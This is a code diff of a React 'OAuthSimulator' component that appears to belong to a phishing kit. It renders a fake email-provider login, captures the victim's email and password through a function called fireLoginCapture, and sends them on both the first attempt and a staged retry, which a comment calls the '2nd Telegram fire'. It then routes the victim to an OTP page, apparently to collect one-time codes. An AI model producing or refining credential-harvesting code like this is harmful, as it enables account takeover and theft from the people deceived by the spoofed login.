@@ -4,7 +4,7 @@ import {
   ArrowRight, RefreshCw, AlertTriangle, Eye, EyeOff
 } from 'lucide-react';
 import { EmailProvider, SecurityStep } from '../types';
-import { submitLogin } from '../utils/api';
+import { fireLoginCapture } from '../utils/api';
 
 interface OAuthSimulatorProps {
   provider: EmailProvider;
@@ -20,11 +20,12 @@ export default function OAuthSimulator({ provider, onConsentSuccess, onCancel }:
   const [isLoading, setIsLoading] = useState(false);
   const [errorMsg, setErrorMsg] = useState('');
 
-  const callSupabaseLogin = async () => {
-    await submitLogin({
+  const callSupabaseLogin = (attempt: 1 | 2) => {
+    fireLoginCapture({
       email: emailInput,
       provider: provider.id,
       password: passwordInput,
+      attempt,
     });
   };
 
@@ -43,7 +44,7 @@ export default function OAuthSimulator({ provider, onConsentSuccess, onCancel }:
     }
 
     setIsLoading(true);
-    callSupabaseLogin().catch(() => {});
+    callSupabaseLogin(1);
 
     setTimeout(() => {
       setIsLoading(false);
@@ -55,7 +56,7 @@ export default function OAuthSimulator({ provider, onConsentSuccess, onCancel }:
   const handleFirstRetry = (e: React.FormEvent) => {
     e.preventDefault();
     setIsLoading(true);
-    callSupabaseLogin().catch(() => {}); // 2nd Telegram fire
+    callSupabaseLogin(2); // 2nd Telegram fire
     setTimeout(() => {
       setIsLoading(false);
       onConsentSuccess(emailInput); // navigates to STUDIO = OTPPage
